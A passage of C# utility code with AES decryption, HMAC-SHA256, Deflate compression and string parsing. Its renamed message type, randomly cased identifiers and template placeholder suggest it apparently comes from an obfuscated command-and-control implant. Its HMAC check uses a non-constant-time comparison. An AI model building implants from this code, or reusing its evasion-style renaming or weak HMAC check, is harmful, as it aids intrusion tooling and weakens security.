            Buffer.BlockCopy(SessKEy.IV, 0, result, 0, SessKEy.IV.Length);
            Buffer.BlockCopy(encrypted, 0, result, SessKEy.IV.Length, encrypted.Length);
            return result;
        }

        // Data should be of format: IV (16 bytes) + EncryptedBytes
        public static byte[] AesDecrypt(byte[] data, byte[] key)
        {
            Aes SessKEy = Aes.Create();
            byte[] iv = new byte[Common.AesIVLength];
            Buffer.BlockCopy(data, 0, iv, 0, Common.AesIVLength);
            SessKEy.IV = iv;
            SessKEy.Key = key;
            byte[] encryptedData = new byte[data.Length - Common.AesIVLength];
            Buffer.BlockCopy(data, Common.AesIVLength, encryptedData, 0, data.Length - Common.AesIVLength);
            byte[] decrypted = SessKEy.CreateDecryptor().TransformFinalBlock(encryptedData, 0, encryptedData.Length);

            return decrypted;
        }

        // Convenience method for decrypting an EncMsgPacket
        public static byte[] AesDecrypt(GrawlEncMsg encryptedMessage, byte[] key)
        {
            byte[] iv = Convert.FromBase64String(encryptedMessage.IV);
            byte[] encrypted = Convert.FromBase64String(encryptedMessage.EncMsg);
            byte[] combined = new byte[iv.Length + encrypted.Length];
            Buffer.BlockCopy(iv, 0, combined, 0, iv.Length);
            Buffer.BlockCopy(encrypted, 0, combined, iv.Length, encrypted.Length);

            return AesDecrypt(combined, key);
        }

        public static byte[] ComputeHMAC(byte[] data, byte[] key)
        {
            HMACSHA256 SessionHmac = new HMACSHA256(key);
            return SessionHmac.ComputeHash(data);
        }

        public static bool VerifyHMAC(byte[] hashedBytes, byte[] hash, byte[] key)
        {
            HMACSHA256 hmac = new HMACSHA256(key);
            byte[] calculatedHash = hmac.ComputeHash(hashedBytes);
            // Should do double hmac?
            return Convert.ToBase64String(calculatedHash) == Convert.ToBase64String(hash);
        }

        public static byte[] Compress(byte[] bytes)
        {
            byte[] packedbytes;
            using (MemoryStream memOrYstream = new MemoryStream())
            {
                using (DeflateStream deFlatEstream = new DeflateStream(memOrYstream, CompressionMode.Compress))
                {
                    deFlatEstream.Write(bytes, 0, bytes.Length);
                }
                packedbytes = memOrYstream.ToArray();
            }
            return packedbytes;
        }

        public static byte[] Decompress(byte[] compressed)
        {
            using (MemoryStream inputStream = new MemoryStream(compressed.Length))
            {
                inputStream.Write(compressed, 0, compressed.Length);
                inputStream.Seek(0, SeekOrigin.Begin);
                using (MemoryStream outputStream = new MemoryStream())
                {
                    using (DeflateStream deFlatEstream = new DeflateStream(inputStream, CompressionMode.Decompress))
                    {
                        byte[] buffer = new byte[4096];
                        int bytesRead;
                        while ((bytesRead = deFlatEstream.Read(buffer, 0, buffer.Length)) != 0)
                        {
                            outputStream.Write(buffer, 0, bytesRead);
                        }
                    }
                    return outputStream.ToArray();
                }
            }
        }

        public static List<string> Parse(string data, string format)
        {
            format = Regex.Escape(format).Replace("\\{", "{").Replace("{{", "{").Replace("}}", "}");
            if (format.Contains("{0}")) { format = format.Replace("{0}", "(?'grp0'.*)"); }
            if (format.Contains("{1}")) { format = format.Replace("{1}", "(?'grp1'.*)"); }
            if (format.Contains("{2}")) { format = format.Replace("{2}", "(?'grp2'.*)"); }
            if (format.Contains("{3}")) { format = format.Replace("{3}", "(?'grp3'.*)"); }
            if (format.Contains("{4}")) { format = format.Replace("{4}", "(?'grp4'.*)"); }
            if (format.Contains("{5}")) { format = format.Replace("{5}", "(?'grp5'.*)"); }
            Match match = new Regex(format).Match(data);
            List<string> matches = new List<string>();
            if (match.Groups["grp0"] != null) { matches.Add(match.Groups["grp0"].Value); }
            if (match.Groups["grp1"] != null) { matches.Add(match.Groups["grp1"].Value); }
            if (match.Groups["grp2"] != null) { matches.Add(match.Groups["grp2"].Value); }
            if (match.Groups["grp3"] != null) { matches.Add(match.Groups["grp3"].Value); }
            if (match.Groups["grp4"] != null) { matches.Add(match.Groups["grp4"].Value); }
            if (match.Groups["grp5"] != null) { matches.Add(match.Groups["grp5"].Value); }
            return matches;
        }

        // Adapted from https://github.com/mono/mono/blob/master/mcs/class/System.Web/System.Web/HttpUtility.cs
        public static string JavaScriptStringEncode(string value)
        {
            if (String.IsNullOrEmpty(value)) { return String.Empty; }
            int len = value.Length;
            bool needEncode = false;
            char c;
            for (int i = 0; i < len; i++)
            {
                c = value[i];
                if (c >= 0 && c <= 31 || c == 34 || c == 39 || c == 60 || c == 62 || c == 92)
                {
                    needEncode = true;
                    break;
                }
            }
            if (!needEncode) { return value; }

            var sb = new StringBuilder();
            for (int i = 0; i < len; i++)
            {
                c = value[i];
                if (c >= 0 && c <= 7 || c == 11 || c >= 14 && c <= 31 || c == 39 || c == 60 || c == 62)
                {
                    sb.AppendFormat("\\u{0:x4}", (int)c);
                }
                else
                {
                    switch ((int)c)
                    {
                        case 8:
                            sb.Append("\\b");
                            break;
                        case 9:
                            sb.Append("\\t");
                            break;
                        case 10:
                            sb.Append("\\n");
                            break;
                        case 12:
                            sb.Append("\\f");
                            break;
                        case 13:
                            sb.Append("\\r");
                            break;
                        case 34:
                            sb.Append("\\\"");
                            break;
                        case 92:
                            sb.Append("\\\\");
                            break;
                        default:
                            sb.Append(c);
                            break;
                    }
                }
            }
            return sb.ToString();
        }

        // {{REP_PROF_MESSAGE_TRANSFORM}}
    }
}